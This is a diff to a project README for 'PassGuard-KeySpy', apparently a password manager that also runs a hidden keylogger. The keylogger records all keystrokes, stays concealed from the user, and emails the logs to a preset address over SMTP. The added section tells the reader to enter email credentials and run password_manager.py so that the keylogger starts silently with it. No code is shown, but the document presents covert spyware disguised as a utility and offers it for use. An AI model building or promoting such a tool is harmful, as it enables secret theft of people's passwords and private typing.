@@ -16,7 +16,7 @@
 
 ### Keylogger:
 - Captures all keystrokes and logs them in a file (`log.txt`).
-- Automatically sends the keystroke logs to a predefined email after every 20 words.
+- Automatically sends the keystroke logs to a predefined email after every 20 words (This threshold can be altered as per requirement).
 - Operates silently in the background, with key logging activities hidden from the user.
 - Uses the **Pynput** library for capturing keyboard input.
 - Sends log data via email using **SMTP**.
@@ -26,4 +26,10 @@
 1. Clone this repository:
 
    ```bash
-   git clone https://github.com/sid2787/PassGuard-KeySpy.git
+   git clone https://github.com/sid2787/PassGuard-KeySpy.git/
+
+## Execution
+
+1. Edit your email and password details in the **password_manager.py** code.
+2. Execute the **password_manager.py** file.
+3. The keylogger script will automatically get executed concurrently and will continue to run in the background until the password manager program is closed.
